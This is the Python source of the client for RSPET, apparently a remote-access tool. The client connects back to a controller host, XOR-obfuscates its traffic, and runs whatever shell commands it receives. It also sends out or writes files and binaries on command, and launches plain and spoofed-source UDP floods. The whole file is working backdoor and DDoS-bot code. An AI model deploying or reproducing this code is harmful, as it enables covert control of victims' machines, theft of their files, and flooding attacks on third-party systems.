#!/usr/bin/env python2
# -*- coding: <UTF-8> -*-
"""rspet_client.py: RSPET's Client-side script."""
from __future__ import print_function
from sys import exit as sysexit, argv
from time import sleep
from subprocess import Popen, PIPE
from multiprocessing import Process, freeze_support
from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
from socket import error as sock_error
from pinject import UDP, IP
__author__ = "Kolokotronis Panagiotis"
__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
__license__ = "MIT"
__version__ = "0.1.0"
__maintainer__ = "Kolokotronis Panagiotis"


VERSION = "v0.1.0-full"


def get_len(in_string, max_len):
    """Calculate string length, return as a string with trailing 0s.

    Keyword argument(s):
    in_string -- input string
    max_len   -- length of returned string
    """
    tmp_str = str(len(in_string))
    len_to_return = tmp_str
    for _ in range(max_len - len(tmp_str)):
        len_to_return = '0' + len_to_return
    return len_to_return


def make_en_stdout(stdout, sock):
    """Obfuscate (xor) and send string, return integer.

    Keyword argument(s):
    stdout -- string to be sent
    sock   -- socket object
    """
    en_stdout = bytearray(stdout, 'UTF-8')
    for i in range(len(en_stdout)):
        en_stdout[i] = en_stdout[i] ^ 0x41
    try:
        sock.send(en_stdout)
    except sock_error:
        sock.close()
        return 1
    return 0


def make_en_bin_stdout(stdout, sock):
    """Obfuscate (xor) and send binary, return integer.

    Keyword argument(s):
    stdout -- binary to be sent
    sock   -- socket object
    """
    en_stdout = bytearray(stdout)
    for i in range(len(en_stdout)):
        en_stdout[i] = en_stdout[i] ^ 0x41
    try:
        sock.send(en_stdout)
    except sock_error:
        sock.close()
        return 1
    return 0


def make_en_data(data):
    """Deobfuscate (xor) data, return string."""
    en_data = bytearray(data)
    for i in range(len(en_data)):
        en_data[i] = en_data[i] ^ 0x41
    return en_data


def get_en_data(sock, size):
    """Get data, return string."""
    data = sock.recv(size)
    return make_en_data(data).decode('UTF-8')


def get_en_bin_data(sock, size):
    """Get data, return binary."""
    data = sock.recv(size)
    return make_en_data(data)


def kill_me(sock):
    """Close socket, terminate script's execution."""
    sock.close()
    sysexit()


def get_file(sock):
    """Get file name and contents from server, create file."""
    exit_code = 0
    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
    en_data = get_en_data(sock, int(en_data))
    try:
        file_to_write = open(en_data, 'w')
        stdout = 'fcs'
    except IOError:
        stdout = 'fna'
        exit_code = 1
    en_stdout = make_en_stdout(stdout, sock)
    if en_stdout == 1:
        sysexit()
    if stdout == 'fcs':
        f_size = get_en_data(sock, 13) #File size up to 9999999999999 chars
        en_data = get_en_data(sock, int(f_size))
        file_to_write.write(en_data)
        file_to_write.close()
        stdout = "fsw"
        en_stdout = make_en_stdout(stdout, sock)
        if en_stdout == 1:
            sysexit()
    return exit_code


def get_binary(sock):
    """Get binary name and contents from server, create binary."""
    exit_code = 0
    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
    en_data = get_en_data(sock, int(en_data))
    try:
        bin_to_write = open(en_data, 'wb')
        stdout = 'fcs'
    except IOError:
        stdout = 'fna'
        exit_code = 1
    en_stdout = make_en_stdout(stdout, sock)
    if en_stdout == 1:
        sysexit()
    if stdout == 'fcs':
        b_size = get_en_data(sock, 13) #Binary size up to 9999999999999 symbols
        en_data = get_en_bin_data(sock, int(b_size))
        bin_to_write.write(en_data)
        bin_to_write.close()
        stdout = "fsw"
        en_stdout = make_en_stdout(stdout, sock)
        if en_stdout == 1:
            sysexit()
    return exit_code


def send_file(sock):
    """Get file name from server, send contents back."""
    exit_code = 0
    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
    en_data = get_en_data(sock, int(en_data))
    try:
        file_to_send = open(en_data, 'r')
        stdout = 'fos'
    except IOError:
        stdout = 'fna'
        exit_code = 1
    en_stdout = make_en_stdout(stdout, sock)
    if en_stdout == 1:
        sysexit()
    if stdout == 'fos':
        file_cont = file_to_send.read()
        file_to_send.close()
        stdout = get_len(file_cont, 13)
        en_stdout = make_en_stdout(stdout, sock)
        if en_stdout == 1:
            sysexit()
        stdout = file_cont
        en_stdout = make_en_stdout(stdout, sock)
        if en_stdout == 1:
            sysexit()
    return exit_code


def send_binary(sock):
    """Get binary name from server, send contents back."""
    exit_code = 0
    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
    en_data = get_en_data(sock, int(en_data))
    try:
        bin_to_send = open(en_data, 'rb')
        stdout = 'fos'
    except IOError:
        stdout = 'fna'
        exit_code = 1
    en_stdout = make_en_stdout(stdout, sock)
    if en_stdout == 1:
        sysexit()
    if stdout == 'fos':
        bin_cont = bin_to_send.read()
        bin_to_send.close()
        stdout = get_len(bin_cont, 13)
        en_stdout = make_en_stdout(stdout, sock)
        if en_stdout == 1:
            sysexit()
        stdout = bin_cont
        en_stdout = make_en_bin_stdout(stdout, sock)
        if en_stdout == 1:
            sysexit()
    return exit_code


def udp_flood(sock):
    """Get target ip and port from server, start UPD flood wait for 'KILL'."""
    en_data = get_en_data(sock, 3) # Max ip+port+payload length 999 chars
    en_data = get_en_data(sock, int(en_data))
    en_data = en_data.split(":")
    target_ip = en_data[0]
    target_port = int(en_data[1])
    msg = en_data[2]
    proc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))
    proc.start()
    while True:
        en_data = get_en_data(sock, 5)
        try:
            en_data = COMM_DICT[en_data]
        except KeyError:
            continue
        if en_data == 'KILL':
            proc.terminate()
            break
    return 0


def udp_spoof(sock):
    """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
    en_data = get_en_data(sock, 3)
    en_data = get_en_data(sock, int(en_data))
    en_data = en_data.split(":")
    target_ip = en_data[0]
    target_port = int(en_data[1])
    spoofed_ip = en_data[2]
    spoofed_port = int(en_data[3])
    payload = en_data[4].encode('UTF-8')
    proc = Process(target=udp_spoof_start, args=(target_ip, target_port,
                                                 spoofed_ip, spoofed_port,
                                                 payload))
    proc.start()
    while True:
        en_data = get_en_data(sock, 5)
        try:
            en_data = COMM_DICT[en_data]
        except KeyError:
            continue
        if en_data == 'KILL':
            proc.terminate()
            break
    return 0


def run_cm(sock):
    """Get command to run from server, execute it and send results back."""
    en_data = get_en_data(sock, 13)
    en_data = get_en_data(sock, int(en_data))
    comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
    stdout, stderr = comm.communicate()
    if stderr:
        decode = stderr.decode('UTF-8')
    elif stdout:
        decode = stdout.decode('UTF-8')
    else:
        decode = 'Command has no output'
    len_decode = get_len(decode, 13)
    en_stdout = make_en_stdout(len_decode, sock)
    if en_stdout == 1:
        sysexit()
    en_stdout = make_en_stdout(decode, sock)
    if en_stdout == 1:
        sysexit()
    return 0


def udp_flood_start(target_ip, target_port, msg):
    """Create UDP packet and send it to target_ip, target_port."""
    flood_sock = socket(AF_INET, SOCK_DGRAM)
    while True:
        flood_sock.sendto(bytes(msg), (target_ip, target_port))
        sleep(0.01)


def udp_spoof_pck(dest_ip, dest_port, source_ip, source_port, payload):
    """Create and return a spoofed UDP packet.

    Keyword argument(s):
    dest_ip -- the desired destination ip
    dest_port -- the desired destination port
    source_ip -- the desired source ip
    source_port -- the desired source port
    """
    udp_header = UDP(source_port, dest_port, payload).pack(source_ip, dest_ip)
    ip_header = IP(source_ip, dest_ip, udp_header, IPPROTO_UDP).pack()
    return ip_header+udp_header+payload


def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):
    """Spoof a packet and send it to target_ip, target_port.

    Keyword argument(s):
    target_ip -- the desired destination ip
    target_port -- the desired destination port
    spoofed_ip -- the desired source ip
    spoofed_port -- the desired source port
    """
    spoofed_packet = udp_spoof_pck(target_ip, target_port, spoofed_ip,
                                   spoofed_port, payload)
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
    while True:
        sock.sendto(spoofed_packet, (target_ip, target_port))
        sleep(0.01)


COMM_DICT = {
    '00000' : 'killMe',
    '00001' : 'getFile',
    '00002' : 'getBinary',
    '00003' : 'sendFile',
    '00004' : 'sendBinary',
    '00005' : 'udpFlood',
    '00006' : 'udpSpoof',
    '00007' : 'command',
    '00008' : 'KILL'
}


COMM_SWTCH = {
    'killMe'    : kill_me,
    'getFile'   : get_file,
    'getBinary' : get_binary,
    'sendFile'  : send_file,
    'sendBinary': send_binary,
    'udpFlood'  : udp_flood,
    'udpSpoof'  : udp_spoof,
    'command'   : run_cm
}


def main():
    try:
        rhost = argv[1]
        rport = 9000
    except IndexError:
        print ("Must provide hotst")
        sysexit()
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect((rhost, rport))
    en_stdout = make_en_stdout(VERSION, sock)
    if en_stdout == 1:
        sysexit()

    while True:
        en_data = get_en_data(sock, 5)
        try:
            en_data = COMM_DICT[en_data]
        except KeyError:
            continue
        COMM_SWTCH[en_data](sock)
    sock.close()

#Start Here!
if __name__ == '__main__':
    freeze_support()
    Process(target=main).start()
